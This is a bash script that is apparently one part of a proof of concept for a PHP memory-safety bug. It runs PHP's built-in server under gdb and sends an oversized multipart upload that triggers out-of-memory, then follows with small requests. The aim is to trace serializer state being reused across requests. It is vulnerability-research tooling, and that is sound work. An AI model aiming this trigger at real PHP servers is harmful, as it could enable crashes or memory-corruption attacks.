#!/usr/bin/env bash
# Deterministic half of the PoC: show BG(serialize) surviving a request boundary.
# Needs no allocator luck — the trace is the proof that the context is reused
# without zend_hash_init().
set -u
cd "$(dirname "$0")"
PORT=${PORT:-9401}
SESS=/tmp/trace-sess
rm -rf "$SESS"; mkdir -p "$SESS"

gdb -q -batch -x trace.gdb --args php -n \
  -d post_max_size=64M -d upload_max_filesize=32M \
  -d "session.save_path=$SESS" -d memory_limit=8M \
  -d session.upload_progress.enabled=1 -d display_errors=1 \
  -S "127.0.0.1:$PORT" -t "$PWD" > /tmp/trace.log 2>&1 &
GDB=$!
sleep 3

python3 - "$PORT" <<'PY'
import sys, time, poc
port = int(sys.argv[1])
try:
    r1 = poc.post(port, poc.multipart("a1", 2_000_000, 1000), "a1")
    print("R1 :", poc.first_line(r1), "| oom:", poc.oom_in(r1))
    time.sleep(0.25)
    for i in range(3):
        sid = f"f{i}"
        print(f"R2.{i}:", poc.first_line(poc.post(port, poc.multipart(sid, 10, 100), sid)))
except OSError as exc:
    print("worker gone:", exc)
PY

sleep 0.5
kill $GDB 2>/dev/null
echo "--- trace ---"
grep -E "HIT" /tmp/trace.log
